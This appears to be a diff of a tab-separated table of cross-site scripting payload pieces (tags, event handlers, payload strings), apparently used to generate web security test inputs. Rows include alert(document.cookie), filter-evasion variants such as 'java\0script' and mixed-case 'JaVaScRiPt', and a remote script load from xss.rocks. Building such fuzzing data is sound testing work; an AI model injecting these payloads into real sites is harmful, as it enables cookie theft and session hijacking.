@@ -1,64 +1,37 @@
-pre	html	event	equals	value	htmlend
-\	<src>	onload	NULL	alert(0)	</src>
-"	<img>	onclick	=	java\0script:alert(\"XSS\")>";'	</img>
-!	<link>	onmouseover	=	alert(0)	</link>
--	<object>	NULL	NULL	alert(document.cookie)	</object>
-'	<script>	onmousemove	=	"javascript:alert(XSS)"	</script>
-\	<img>	onmousemove	NULL	"alert(document.cookie)"	</img>
--	<link>	onclick	NULL	"javascript:alert(XSS)"	</link>
-!	<object>	onload	=	"javascript:alert(XSS)"	</object>
-\	<script>	onmouseover	NULL	java\0script:alert(\"XSS\")>";'	</script>
->	<src>	NULL	=	"background-image: url(&#1;javascript:alert('XSS'))"	</src>
-'	<link>	onload	NULL	java\0script:alert(\"XSS\")>";'	</link>
-'	<src>	onmouseover	=	"alert(document.cookie)"	</src>
-'	<object>	onclick	NULL	alert(XSS)	</object>
-\	<object>	NULL	=	JaVaScRiPt:alert('XSS')	</object>
-;	<script>	NULL	=	alert(XSS)	</script>
->	<img>	onmouseover	NULL	"http://xss.rocks/xss.js"	</img>
-'	<img>	NULL	=	alert(document.cookie)	</img>
-;	<src>	onmousemove	NULL	"javascript:alert(XSS)"	</src>
-!	<img>	onmousemove	NULL	alert(XSS)	</img>
-\	<link>	onmousemove	=	"http://xss.rocks/xss.js"	</link>
-"	<object>	onmouseover	NULL	"javascript:alert(XSS)"	</object>
-\	<link>	onclick	=	alert(XSS)	</link>
-"	<script>	onload	=	alert(document.cookie)	</script>
--	<script>	onclick	=	"alert(document.cookie)"	</script>
->	<link>	NULL	=	"javascript:alert(XSS)"	</link>
-;	<link>	onclick	=	alert(document.cookie)	</link>
-"	<link>	NULL	NULL	"alert(document.cookie)"	</link>
-!	<src>	onclick	=	"http://xss.rocks/xss.js"	</src>
->	<object>	onmousemove	NULL	alert(XSS)	</object>
-!	<script>	onload	NULL	"background-image: url(&#1;javascript:alert('XSS'))"	</script>
-"	<object>	onload	NULL	"http://xss.rocks/xss.js"	</object>
-\	<img>	onload	NULL	"javascript:alert(XSS)"	</img>
->	<script>	onload	=	"alert(document.cookie)"	</script>
-;	<object>	onload	NULL	java\0script:alert(\"XSS\")>";'	</object>
-"	<object>	onmousemove	=	alert(0)	</object>
-;	<img>	onmouseover	NULL	"alert(document.cookie)"	</img>
->	<src>	onclick	NULL	alert(document.cookie)	</src>
-!	<src>	NULL	=	java\0script:alert(\"XSS\")>";'	</src>
-!	<link>	onmouseover	NULL	JaVaScRiPt:alert('XSS')	</link>
->	<src>	onmousemove	NULL	JaVaScRiPt:alert('XSS')	</src>
--	<img>	onmouseover	=	alert(0)	</img>
->	<src>	onmousemove	NULL	java\0script:alert(\"XSS\")>";'	</src>
-'	<script>	NULL	=	alert(0)	</script>
-;	<script>	onload	NULL	JaVaScRiPt:alert('XSS')	</script>
->	<link>	onclick	NULL	alert(0)	</link>
-;	<img>	onmouseover	NULL	"background-image: url(&#1;javascript:alert('XSS'))"	</img>
--	<img>	onmousemove	NULL	JaVaScRiPt:alert('XSS')	</img>
-\	<object>	onmousemove	NULL	"background-image: url(&#1;javascript:alert('XSS'))"	</object>
--	<script>	onload	=	"http://xss.rocks/xss.js"	</script>
--	<link>	onclick	NULL	"background-image: url(&#1;javascript:alert('XSS'))"	</link>
-!	<link>	onmouseover	NULL	alert(document.cookie)	</link>
--	<src>	onmouseover	NULL	alert(XSS)	</src>
-;	<link>	NULL	NULL	"http://xss.rocks/xss.js"	</link>
-!	<object>	onload	=	"alert(document.cookie)"	</object>
-;	<script>	onmouseover	NULL	alert(0)	</script>
-'	<img>	NULL	NULL	"http://xss.rocks/xss.js"	</img>
-'	<object>	onclick	=	"background-image: url(&#1;javascript:alert('XSS'))"	</object>
--	<object>	onmousemove	NULL	java\0script:alert(\"XSS\")>";'	</object>
-"	<src>	onclick	=	JaVaScRiPt:alert('XSS')	</src>
-'	<script>	onmouseover	NULL	JaVaScRiPt:alert('XSS')	</script>
-"	<img>	onload	=	alert(XSS)	</img>
-"	<img>	onload	NULL	"background-image: url(&#1;javascript:alert('XSS'))"	</img>
-\	<link>	onmousemove	=	alert(document.cookie)	</link>
+html_open	src	href	event	equal	payload	html_close
+<body	NULL	NULL	onerror	=	JaVaScRiPt:alert('XSS')	></body>
+<audio	src=1	href=1	onload	=	alert("XSS")	></audio>
+<video	NULL	NULL	onclick	=	alert(document.cookie)	></video>
+<object	NULL	NULL	onmousemove	=	alert(0)	></object>
+<img	src=1	href=1	onmouseover	=	"alert(document.cookie)"	></img>
+<body	src=1	href=1	onclick	=	"alert(document.cookie)"	></body>
+<img	NULL	NULL	onload	=	alert(0)	></img>
+<video	src=1	href=1	onerror	=	alert(0)	></video>
+<object	NULL	NULL	onmouseover	=	"javascript:alert('XSS')"	></object>
+<body	src=1	href=1	onmousemove	=	alert("XSS")	></body>
+<script>	NULL	NULL	onload	=	alert(document.cookie)	</script>
+<body	src=1	href=1	onload	=	"javascript:alert('XSS')"	></body>
+<audio	NULL	NULL	onmouseover	=	alert(0)	></audio>
+<video	src=1	href=1	onmousemove	=	"javascript:alert('XSS')"	></video>
+<audio	NULL	NULL	onmousemove	=	"alert(document.cookie)"	></audio>
+<object	src=1	href=1	onerror	=	alert(document.cookie)	></object>
+<img	src=1	href=1	onmousemove	=	alert(document.cookie)	></img>
+<object	NULL	NULL	onclick	=	alert("XSS")	></object>
+<script>	NULL	NULL	onerror	=	"javascript:alert('XSS')"	</script>
+<video	NULL	NULL	onload	=	"alert(document.cookie)"	></video>
+<body	NULL	NULL	onmouseover	=	alert(0)	></body>
+<img	src=1	href=1	onclick	=	JaVaScRiPt:alert('XSS')	></img>
+<script>	NULL	NULL	onmouseover	=	alert("XSS")	</script>
+<video	NULL	NULL	onmouseover	=	JaVaScRiPt:alert('XSS')	></video>
+<video	src=1	href=1	onerror	=	alert("XSS")	></video>
+<img	src=1	href=1	onclick	=	"javascript:alert('XSS')"	></img>
+<object	src=1	href=1	onerror	=	"alert(document.cookie)"	></object>
+<script>	NULL	NULL	onmousemove	=	JaVaScRiPt:alert('XSS')	</script>
+<img	NULL	NULL	onerror	=	alert("XSS")	></img>
+<audio	src=1	href=1	onclick	=	JaVaScRiPt:alert('XSS')	></audio>
+<audio	src=1	href=1	onerror	=	alert(document.cookie)	></audio>
+<object	src=1	href=1	onload	=	JaVaScRiPt:alert('XSS')	></object>
+<script>	NULL	NULL	onclick	=	alert(0)	</script>
+<script>	NULL	NULL	onmousemove	=	"alert(document.cookie)"	</script>
+<body	src=1	href=1	onmouseover	=	alert(document.cookie)	></body>
+<audio	NULL	NULL	onmousemove	=	"javascript:alert('XSS')"	></audio>
